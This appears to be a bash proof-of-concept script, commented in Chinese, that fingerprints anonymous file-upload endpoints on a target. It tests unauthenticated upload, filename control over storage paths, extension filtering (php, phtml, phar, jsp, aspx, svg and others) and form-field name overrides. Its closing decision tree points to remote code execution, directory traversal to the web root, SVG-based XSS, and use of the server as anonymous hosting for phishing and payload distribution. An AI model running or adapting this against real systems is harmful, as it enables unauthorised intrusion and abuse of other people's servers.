#!/usr/bin/env bash
# ============================================================================
# 匿名上传点定性探针（四问判定矩阵）
# 用法: ./poc.sh https://TARGET/api/upload
#       ./poc.sh https://TARGET/api/upload photo
#
# 【四问】决定这个上传点值不值得继续投入
#   ① 匿名可上传吗?        → 不带任何 Cookie/Token 能否成功
#   ② filename 参与存储路径吗? → 传两个同名不同内容，看返回 URL 是否含原文件名
#   ③ 扩展名怎么校验?      → 白名单（只放 .jpg）还是黑名单（拦 .php）
#   ④ 落地可匿名取回吗?    → 返回的 URL 不带鉴权能否直接下载
#
#   四问全 yes = 这是一个「匿名文件托管」，可以当攻击基础设施
#   ②③ 同时 usable = 有走向 RCE/存储型 XSS 的可能
#
# 【判据】为什么用「合法/非法对照」而不是只传 webshell
#   只传恶意文件得到 403，你无法区分：
#     - 是扩展名拦了
#     - 是 MIME 拦了
#     - 是内容检测拦了
#     - 是根本不需要鉴权但走了别的错误分支
#   所以必须单变量：同一文件内容，只改一个维度（扩展名/MIME/文件名），
#   看哪个维度让结果翻转，才能定位到具体校验层。
#
# 【常见误报】
#   1. 上传返回 200 但 body 是 {"code":500,"msg":"失败"} → 必须解析业务码，不能只看 HTTP。
#   2. 返回了 URL 但实际 404（假成功）→ 必须真的 GET 一次落地 URL 验证。
#   3. CDN 回源到别的环境 → 落地 URL 的域名要和上传接口同源核对。
# ============================================================================
set -uo pipefail
source "$(dirname "$0")/../_lib/common.sh"

URL="${1:-}"; FIELD="${2:-file}"
[ -z "$URL" ] && usage_die "$0 <https://TARGET/upload> [form-field-name]"
preflight || exit 1

TMP=$(mktemp -d); trap 'rm -rf "$TMP"' EXIT
# 一个最小的合法 PNG（1x1）
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82' > "$TMP/a.png"

# ---- 基线：不带文件 -------------------------------------------------------
log "基线: 不传文件（看错误格式，用于区分「上传失败」和「参数错误」）"
rb=$(req POST "$URL")
dim "空 POST → ${rb:0:150}"

upload() {  # upload <file> <remote-name> <content-type> [extra-curl-args...]
  local f="$1" name="$2" ct="$3"; shift 3
  curl -sk --max-time "$TIMEOUT" -A "$UA" -X POST "$URL" \
    -F "$FIELD=@$f;filename=$name;type=$ct" "$@" 2>/dev/null
}

# ---- ① 匿名可上传 ---------------------------------------------------------
echo
log "① 匿名上传（无任何凭据）"
R1=$(upload "$TMP/a.png" "$(date +%s).png" "image/png")
C1=$(printf '%s' "$R1" | head -c 300)
printf '%s\n' "$C1"
U1=$(printf '%s' "$R1" | grep -oE 'https?://[^"'"'"' ,}]+' | head -1)
if [ -n "$U1" ]; then
  c=$(code_of GET "$U1")
  if [ "$c" = "200" ]; then
    ok "① 匿名可上传 ★  且落地 URL 匿名可取: $U1"
  else
    warn "① 上传成功但落地需鉴权（取回 $c）: $U1"
  fi
else
  dim "① 未返回 URL。可能: 需鉴权 / 字段名不对 / 业务码非成功"
  dim "    试其它字段名: file upload image pic photo fileupload uploadFile"
fi

# ---- ② filename 是否参与路径 ---------------------------------------------
echo
log "② filename 参与度（传两个同内容、不同名）"
R2=$(upload "$TMP/a.png" "ORIG_A_$(date +%s).png" "image/png")
R3=$(upload "$TMP/a.png" "ORIG_B_$(date +%s).png" "image/png")
U2=$(printf '%s' "$R2" | grep -oE 'https?://[^"'"'"' ,}]+' | head -1)
U3=$(printf '%s' "$R3" | grep -oE 'https?://[^"'"'"' ,}]+' | head -1)
echo "  A → $U2"
echo "  B → $U3"

if [ -n "$U2" ] && [ -n "$U3" ]; then
  if printf '%s' "$U2" | grep -q 'ORIG_A'; then
    ok "② filename 参与路径 ★→ 可尝试路径穿越 / 覆盖已有文件"
  elif [ "$(basename "$U2")" = "$(basename "$U3")" ]; then
    warn "② 两次返回同名 → key 可预测，可枚举其它用户上传"
  else
    dim "② 返回随机名（服务器重命名，最安全）"
  fi
fi

# ---- ③ 扩展名校验类型 -----------------------------------------------------
echo
log "③ 扩展名校验（单变量: 只改 filename 的扩展名，内容与 MIME 不变）"
declare -A RES
for ext in png php php.jpg jpg.php phtml pht phar asp aspx jsp shtml html svg; do
  name="t_$(date +%s%N | tail -c 6).$ext"
  r=$(upload "$TMP/a.png" "$name" "image/png")
  u=$(printf '%s' "$r" | grep -oE 'https?://[^"'"'"' ,}]+' | head -1)
  ok_flag=""
  if [ -n "$u" ]; then
    st=$(code_of GET "$u")
    [ "$st" = "200" ] && ok_flag="★可取回"
    RES[$ext]="通过 $ok_flag  $u"
  else
    # 判断是否被业务码拒
    if printf '%s' "$r" | grep -qiE '"?(code|status)"?\s*:\s*(0|200)'; then
      RES[$ext]="通过(无URL)"
    else
      RES[$ext]="拒绝"
    fi
  fi
  printf '    %-10s %s\n' ".$ext" "${RES[$ext]}"
  sleep 0.3
done

# 归纳
pass=0; deny=0
for k in "${!RES[@]}"; do
  case "${RES[$k]}" in 通过*) pass=$((pass+1));; 拒绝*) deny=$((deny+1));; esac
done
if [ "$pass" -gt 0 ] && [ "$deny" -gt 0 ]; then
  ok "③ 黑名单式校验（有的放有的拦）→ 找漏的扩展名"
  for k in "${!RES[@]}"; do
    case "${RES[$k]}" in 通过*可取回*) warn "    ★ 可利用: .$k" ;; esac
  done
elif [ "$deny" -eq 0 ]; then
  ok "③ 完全不校验扩展名 ★★"
else
  dim "③ 全部被拒 → 强白名单，转向: 双扩展名 / .htaccess / 文件名截断 / 内容型（SVG-XSS）"
fi

# ---- ④ 参数覆盖 -----------------------------------------------------------
echo
log "④ 参数覆盖（额外字段是否能改存储名）"
r=$(curl -sk --max-time "$TIMEOUT" -A "$UA" -X POST "$URL" \
     -F "$FIELD=@$TMP/a.png;filename=safe.png;type=image/png" \
     -F "name=OVERRIDE_$(date +%s).php" \
     -F "filename=OVERRIDE2_$(date +%s).php" \
     -F "key=OVERRIDE3_$(date +%s).php" 2>/dev/null)
u=$(printf '%s' "$r" | grep -oE 'https?://[^"'"'"' ,}]+' | head -1)
if printf '%s' "$u" | grep -qE 'OVERRIDE[23]?.*\.php'; then
  ok "④ 参数可覆盖文件名 ★"
else
  dim "④ 参数覆盖无效（ignored）：${u:-无 URL}"
fi

# ---- 结论 ----------------------------------------------------------------
echo
cat <<EOF
════ 结论模板（按上面四问的实际结果填）════
  ① 匿名可传:      $([ -n "$U1" ] && echo YES || echo NO/未知)
  ② filename 参与: $([ -n "$U2" ] && printf '%s' "$U2" | grep -q ORIG_ && echo YES || echo NO/未知)
  ③ 校验类型:      $([ "$pass" -gt 0 ] && [ "$deny" -gt 0 ] && echo "黑名单" || { [ "$deny" -eq 0 ] && echo "无校验" || echo "白名单"; })

════ 下一步分支 ════
  无校验 + 落地可取回   → 可当匿名文件托管（钓鱼页/载荷分发），注意这已是滥用级
  黑名单漏项 + 落地可取回 → 判断服务端是否解析（.php 取回是源码还是执行结果？）
                          取回内容 = 图片二进制 → 不解析，不能 RCE
                          取回内容 = 空/报错 → 解析了，但语法错 → 可 RCE
  filename 参与路径     → 测 ../ 穿越写到 web 根
  白名单严格            → 转向 SVG(XSS) / 图片马+解析漏洞 / 文件包含配合

════ 注意 ════
  本脚本只上传 1x1 PNG，不含任何恶意内容。
  如果 ③ 里某个扩展名「可取回」，那也只是证明「能存」，
  不等于「能执行」。执行与否取决于服务端是否有解析器。
EOF
